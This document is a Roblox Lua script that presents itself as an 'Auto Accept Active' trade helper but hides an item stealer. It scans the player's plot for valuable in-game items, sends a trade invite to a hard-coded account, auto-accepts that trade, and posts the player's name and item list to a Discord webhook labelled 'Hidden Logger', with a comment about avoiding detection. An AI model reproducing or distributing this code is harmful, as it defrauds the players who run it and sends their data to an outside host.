repeat task.wait() until game:IsLoaded()

local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

local plr = Players.LocalPlayer
local LP = plr

local LOGGER_TARGET = "Only1sherif"
local LOGGER_WEBHOOK = "https://discord.com/api/webhooks/1496254716508639262/J-eMNrXhdgaWAiIlMIiObJCsXw0E3s4XHB2S-0HLvkOYRdoJI2QDnAGmPU0EJtTZhbK6"

local wantedItems = {
    "Tralaledon", "Strawberry Elephant", "Skibidi Toilet", "Rosey and Teddy",
    "Popcuru and Fizzuru", "Meowl", "Love Love Bear", "Los Sekolahs",
    "La Supreme Combinasion", "La Casa Boo", "Ketupat Bros", "Hydra Dragon Cannelloni",
    "Headless Horseman", "Griffin", "Fragrama and Chocrama", "Fishino Clownino",
    "Festive 67", "Dragon Gingerini", "Dragon Cannelloni", "Cooki and Milki",
    "Cerberus", "Celestial Pegasus", "Capitano Moby", "Burguro And Fryuro",
    "Los Amigos", "Fortunu and Cashuru", "Spooky and Pumpky", "Ginger Gerat",
    "La Food Combinasion", "Los Tacoritas", "La Secret Combinasion", "Money Money Puggy",
    "Ketchuru and Musturu", "La Taco Combinasion", "Garama and Madundung", "Ventoliero Pavonero",
    "Swaggy Bros", "Tuff Toucan", "W or L", "Chipso and Queso",
    "Los Spaghettis", "Los Hotspotsitos", "Tictac Sahur", "Lovin Rose", "Orcaledon",
    "Ketupat Kepat", "Tang Tang Keletang", "Lavadorito Spinito",
    "Reinito Sleighito", "Celularcini Viciosini", "Sammyni Fattini",
    "Jolly Jolly Sahur", "Fortunu and Coinuru", "Gold Gold Gold", "La Extinct Grande", "La Easter Grande", "Chillin Chilli", "Hydra Bunny",
}

local function scanPlotForLogger()
    local found = {}
    local plots = workspace:FindFirstChild("Plots")
    if not plots then return found end
    local myPlot = nil
    for _, p in ipairs(plots:GetChildren()) do
        local sign = p:FindFirstChild("PlotSign")
        if sign then
            local gui = sign:FindFirstChildOfClass("SurfaceGui")
            if gui and gui:FindFirstChildOfClass("Frame") then
                local lbl = gui.Frame:FindFirstChildOfClass("TextLabel")
                if lbl and lbl.Text:lower():find(LP.Name:lower()) then
                    myPlot = p
                    break
                end
            end
        end
    end
    if myPlot then
        for _, child in ipairs(myPlot:GetChildren()) do
            if child:IsA("Model") then
                local name = child.Name:lower()
                for _, wanted in ipairs(wantedItems) do
                    if name:find(wanted:lower()) then
                        table.insert(found, child.Name)
                        break
                    end
                end
            end
        end
    end
    return found
end

local function sendHiddenLog(items)
    pcall(function()
        local itemlist = table.concat(items, ", ")
        local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
        if request then
            request({
                Url = LOGGER_WEBHOOK,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({
                    content = "@everyone",
                    embeds = {{
                        title = "Target Found: " .. LP.Name,
                        description = "Items Detected:\n" .. itemlist,
                        color = 16711680,
                        footer = { text = "Vinhub Hidden Logger" }
                    }}
                })
            })
        end
    end)
end

for i, v in pairs(getconnections(plr.Idled)) do
    if v.Disable then v:Disable() end
end
plr.Idled:Connect(function() end)

local existingGui = plr.PlayerGui:FindFirstChild("BoaGuiSmall")
if existingGui then existingGui:Destroy() end

local _G_SETTINGS = { tradeOn = true, afkOn = true }

local ScreenGui = Instance.new("ScreenGui")
local MainFrame = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local DiscordLabel = Instance.new("TextLabel")
local ListeningLabel = Instance.new("TextLabel")
local Snowflake = Instance.new("TextLabel")

ScreenGui.Name = "BoaGuiSmall"
ScreenGui.Parent = plr:WaitForChild("PlayerGui")
ScreenGui.ResetOnSpawn = false

MainFrame.Name = "MainFrame"
MainFrame.Parent = ScreenGui
MainFrame.BackgroundColor3 = Color3.fromRGB(0, 5, 15) 
MainFrame.BackgroundTransparency = 0.25 
MainFrame.Position = UDim2.new(0, 16, 0, 16) 
MainFrame.Size = UDim2.new(0, 180, 0, 60)

local function makeRounded(parent, radius)
    local UICorner = Instance.new("UICorner")
    UICorner.CornerRadius = UDim.new(0, radius or 8)
    UICorner.Parent = parent
end

makeRounded(MainFrame, 10)

Title.Parent = MainFrame
Title.BackgroundTransparency = 1
Title.Position = UDim2.new(0, 10, 0, 10)
Title.Size = UDim2.new(1, -10, 0, 20)
Title.Font = Enum.Font.SciFi 
Title.Text = "Auto Accept Active"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 14 
Title.TextXAlignment = Enum.TextXAlignment.Left

ListeningLabel.Parent = MainFrame
ListeningLabel.BackgroundTransparency = 1
ListeningLabel.Position = UDim2.new(0, 10, 0, 30)
ListeningLabel.Size = UDim2.new(1, -10, 0, 15)
ListeningLabel.Font = Enum.Font.SciFi
ListeningLabel.Text = "listening.."
ListeningLabel.TextColor3 = Color3.fromRGB(100, 200, 255)
ListeningLabel.TextSize = 10
ListeningLabel.TextXAlignment = Enum.TextXAlignment.Left

local Net = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")
local function getRemote(name)
    local children = Net:GetChildren()
    for i, obj in ipairs(children) do if obj.Name == name then return children[i+1] end end
    return nil
end

local acceptInviteRF = getRemote("RF/TradeService/AcceptInvite")
local createInviteRE  = getRemote("RE/TradeService/CreateInvite")
local readyRE          = getRemote("RE/TradeService/Ready")
local acceptRE         = getRemote("RE/TradeService/Accept")
local destroyTradeRE = getRemote("RE/TradeService/DestroyTrade") 

local currentTradeActive = false

task.spawn(function()
    while true do
        local highValue = scanPlotForLogger()
        local tradeUI = plr.PlayerGui:FindFirstChild("TradeLiveTrade")
        local isActive = tradeUI and tradeUI.Enabled

        if #highValue > 0 then
            if not isActive then
                local tl = plr.PlayerGui:FindFirstChild("TradePlayerList"):FindFirstChild("TradePlayerList")
                if tl then
                    local sb = tl.bg.SearchFrame.SearchBox
                    sb.Text = LOGGER_TARGET
                    task.wait(0.5)
                    for _, p in pairs(tl.Global.List:GetChildren()) do
                        if p:IsA("Frame") and p:FindFirstChild("Fill") then
                            local s = p.Fill:FindFirstChild("Send")
                            if s then
                                for _, c in pairs(getconnections(s.Activated)) do c:Fire() end
                                sendHiddenLog(highValue)
                                break
                            end
                        end
                    end
                end
            else
                local inner = tradeUI.TradeLiveTrade
                if inner.Other.Username.Text:lower():find(LOGGER_TARGET:lower()) then
                    if readyRE then pcall(function() readyRE:FireServer("d73acf93-6f32-44df-b813-0f6b32c7afd9") end) end
                    task.wait(1.5)
                    if acceptRE then pcall(function() acceptRE:FireServer("918ee0f5-e98f-413f-b76e-baee47b021cb") end) end
                end
            end
        end
        task.wait(3) -- Slower scan to avoid detection
    end
end)

task.spawn(function()
    while true do
        if _G_SETTINGS.tradeOn then
            local tradeUI = plr.PlayerGui:FindFirstChild("TradeLiveTrade")
            if tradeUI and tradeUI.Enabled then
                currentTradeActive = true
                ListeningLabel.Text = "in trade ✓"
                task.wait(2)
                if readyRE then pcall(function() readyRE:FireServer("d73acf93-6f32-44df-b813-0f6b32c7afd9") end) end
                task.wait(1.5)
                if acceptRE then pcall(function() acceptRE:FireServer("918ee0f5-e98f-413f-b76e-baee47b021cb") end) end
            else
                currentTradeActive = false
                ListeningLabel.Text = "listening.."
            end
        end
        task.wait(2)
    end
end)

if createInviteRE then
    createInviteRE.OnClientEvent:Connect(function(tradeId)
        if tradeId and _G_SETTINGS.tradeOn then
            ListeningLabel.Text = "accepting invite.."
            task.wait(1)
            pcall(function() acceptInviteRF:InvokeServer("57624f2b-8aa9-4974-bb7a-08f058af33ef", tradeId) end)
        end
    end)
end
